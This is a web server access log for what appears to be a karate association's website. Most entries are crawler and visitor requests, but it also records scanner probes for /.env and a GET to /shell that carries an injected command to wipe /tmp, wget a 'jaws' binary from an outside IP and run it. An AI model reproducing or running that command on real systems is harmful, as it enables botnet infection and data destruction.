::ffff:114.119.152.119 - - [22/Sep/2022:08:05:18 +0000] "GET /joinemail?type=blackbeltclasses HTTP/1.1" 200 8998 "http://www.wadokikai.org/events" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:135.125.244.48 - - [22/Sep/2022:08:06:35 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [22/Sep/2022:08:06:36 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:114.119.152.108 - - [22/Sep/2022:08:10:32 +0000] "GET /joinemail?type=tournaments HTTP/1.1" 200 8829 "http://www.wadokikai.org/events" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:203.76.100.138 - - [22/Sep/2022:08:15:50 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
::ffff:14.29.182.82 - - [22/Sep/2022:08:24:25 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
::ffff:207.46.13.215 - - [22/Sep/2022:08:35:21 +0000] "GET /images/books/karatedojo.jpg HTTP/1.1" 200 3457 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:128.14.134.170 - - [22/Sep/2022:08:36:14 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:73.93.253.46 - - [22/Sep/2022:08:39:47 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:66.249.66.196 - - [22/Sep/2022:08:45:44 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.66.198 - - [22/Sep/2022:08:45:44 +0000] "GET /events HTTP/1.1" 200 9083 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.125 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:73.93.253.46 - - [22/Sep/2022:09:03:07 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:185.181.60.189 - - [22/Sep/2022:09:11:52 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Edg/91.0.864.54"
::ffff:73.93.253.46 - - [22/Sep/2022:09:26:27 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "https://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:135.125.244.48 - - [22/Sep/2022:09:32:28 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [22/Sep/2022:09:32:29 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:157.55.39.228 - - [22/Sep/2022:09:40:47 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:66.249.66.198 - - [22/Sep/2022:09:45:44 +0000] "GET /schools HTTP/1.1" 200 97308 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.125 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:192.241.220.147 - - [22/Sep/2022:09:52:48 +0000] "GET /actuator/health HTTP/1.1" 404 154 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:71.198.107.30 - - [22/Sep/2022:09:53:09 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:53:09 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:53:09 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:53:09 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:53:09 +0000] "GET /js/common.js HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:53:09 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:53:09 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:53:09 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:53:09 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:53:09 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:53:10 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:53:10 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:53:10 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:53:10 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:53:10 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:53:13 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:53:16 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 200 35066 "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:207.46.13.200 - - [22/Sep/2022:09:53:57 +0000] "GET /schools HTTP/1.1" 200 97308 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:40.77.167.46 - - [22/Sep/2022:09:54:22 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.198 - - [22/Sep/2022:09:54:26 +0000] "GET /images/fbpic.webp HTTP/1.1" 200 986 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:207.46.13.198 - - [22/Sep/2022:09:54:26 +0000] "GET /images/igpic.webp HTTP/1.1" 200 1328 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:156.196.235.145 - - [22/Sep/2022:09:55:51 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+185.216.71.192/jaws;sh+/tmp/jaws HTTP/1.1" 404 144 "-" "Hello, world"
::ffff:71.198.107.30 - - [22/Sep/2022:09:57:15 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:57:18 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:157.55.39.228 - - [22/Sep/2022:09:57:48 +0000] "GET /images/instructors/mbrooks.jpg HTTP/1.1" 200 132490 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:71.198.107.30 - - [22/Sep/2022:09:57:50 +0000] "GET / HTTP/1.1" 304 - "-" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:57:50 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:57:50 +0000] "GET /js/common.js HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:57:50 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:57:50 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:57:50 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:57:50 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:57:50 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:57:50 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:57:50 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:57:50 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:57:50 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:57:50 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:57:50 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:57:50 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:57:50 +0000] "GET /images/favicon.ico HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:57:54 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:57:56 +0000] "GET /images/promotions/AFSPrelimSchedule.pdf HTTP/1.1" 200 57396 "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:57:57 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:58:01 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:71.198.107.30 - - [22/Sep/2022:09:58:05 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 12; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:207.46.13.202 - - [22/Sep/2022:10:03:42 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:157.55.39.132 - - [22/Sep/2022:10:06:54 +0000] "GET /resources HTTP/1.1" 200 194907 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:157.55.39.228 - - [22/Sep/2022:10:07:09 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:207.46.13.131 - - [22/Sep/2022:10:07:13 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:40.77.167.70 - - [22/Sep/2022:10:08:08 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:122.176.201.107 - - [22/Sep/2022:10:10:05 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Vivaldi/5.3.2679.68"
::ffff:122.176.201.107 - - [22/Sep/2022:10:10:06 +0000] "GET /contact?s=1&ss=5 HTTP/1.1" 200 9997 "http://wadokikai.org" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Vivaldi/5.3.2679.68"
::ffff:122.176.201.107 - - [22/Sep/2022:10:10:07 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "http://wadokikai.org" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Vivaldi/5.3.2679.68"
::ffff:122.176.201.107 - - [22/Sep/2022:10:10:07 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "http://wadokikai.org" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Vivaldi/5.3.2679.68"
::ffff:122.176.201.107 - - [22/Sep/2022:10:10:08 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "http://wadokikai.org" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Vivaldi/5.3.2679.68"
::ffff:122.176.201.107 - - [22/Sep/2022:10:10:09 +0000] "GET /contact?s=1&ss=9 HTTP/1.1" 200 9997 "http://wadokikai.org" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Vivaldi/5.3.2679.68"
::ffff:122.176.201.107 - - [22/Sep/2022:10:10:09 +0000] "GET /contact?s=1&ss=8 HTTP/1.1" 200 9997 "http://wadokikai.org" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Vivaldi/5.3.2679.68"
::ffff:122.176.201.107 - - [22/Sep/2022:10:10:10 +0000] "GET /contact?s=1&ss=7 HTTP/1.1" 200 9997 "http://wadokikai.org" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Vivaldi/5.3.2679.68"
::ffff:122.176.201.107 - - [22/Sep/2022:10:10:10 +0000] "GET /contact?s=1&ss=1 HTTP/1.1" 200 9997 "http://wadokikai.org" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Vivaldi/5.3.2679.68"
::ffff:122.176.201.107 - - [22/Sep/2022:10:10:11 +0000] "GET /contact?s=1&ss=0 HTTP/1.1" 200 9997 "http://wadokikai.org" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Vivaldi/5.3.2679.68"
::ffff:122.176.201.107 - - [22/Sep/2022:10:10:11 +0000] "GET /contact HTTP/1.1" 200 10017 "http://wadokikai.org" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Vivaldi/5.3.2679.68"
::ffff:122.176.201.107 - - [22/Sep/2022:10:10:14 +0000] "POST /sendemail HTTP/1.1" 302 96 "http://wadokikai.org/contact?s=1&ss=7" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Vivaldi/5.3.2679.68"
::ffff:122.176.201.107 - - [22/Sep/2022:10:10:15 +0000] "GET /contact/?msg=sent&s=1 HTTP/1.1" 200 10400 "http://wadokikai.org/sendemail" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Vivaldi/5.3.2679.68"
::ffff:135.125.244.48 - - [22/Sep/2022:10:14:46 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [22/Sep/2022:10:14:47 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:114.119.145.212 - - [22/Sep/2022:10:14:55 +0000] "GET /images/tournaments/2022LEAGUEDivisions.pdf HTTP/1.1" 200 766218 "http://34.212.47.6/events" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:37.139.53.81 - - [22/Sep/2022:10:16:51 +0000] "GET / HTTP/1.0" 200 58140 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36"
::ffff:37.139.53.81 - - [22/Sep/2022:10:16:52 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36"
::ffff:37.139.53.81 - - [22/Sep/2022:10:16:52 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.net/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36"
::ffff:37.139.53.86 - - [22/Sep/2022:10:20:13 +0000] "GET / HTTP/1.0" 200 58140 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:37.139.53.86 - - [22/Sep/2022:10:20:14 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:37.139.53.86 - - [22/Sep/2022:10:20:15 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:157.55.39.132 - - [22/Sep/2022:10:28:17 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:114.119.145.194 - - [22/Sep/2022:10:30:17 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 200 691794 "http://34.212.47.6/resources" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:167.71.130.9 - - [22/Sep/2022:10:34:58 +0000] "HEAD / HTTP/1.0" 200 58140 "-" "-"
::ffff:167.71.130.9 - - [22/Sep/2022:10:34:59 +0000] "GET /system_api.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
::ffff:167.71.130.9 - - [22/Sep/2022:10:34:59 +0000] "GET /c/version.js HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
::ffff:167.71.130.9 - - [22/Sep/2022:10:35:00 +0000] "GET /streaming/clients_live.php HTTP/1.1" 404 165 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
::ffff:167.71.130.9 - - [22/Sep/2022:10:35:01 +0000] "GET /stalker_portal/c/version.js HTTP/1.1" 404 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
::ffff:167.71.130.9 - - [22/Sep/2022:10:35:01 +0000] "GET /stream/live.php HTTP/1.1" 404 154 "-" "VLC/3.0.8 LibVLC/3.0.8"
::ffff:167.71.130.9 - - [22/Sep/2022:10:35:02 +0000] "GET /flu/403.html HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
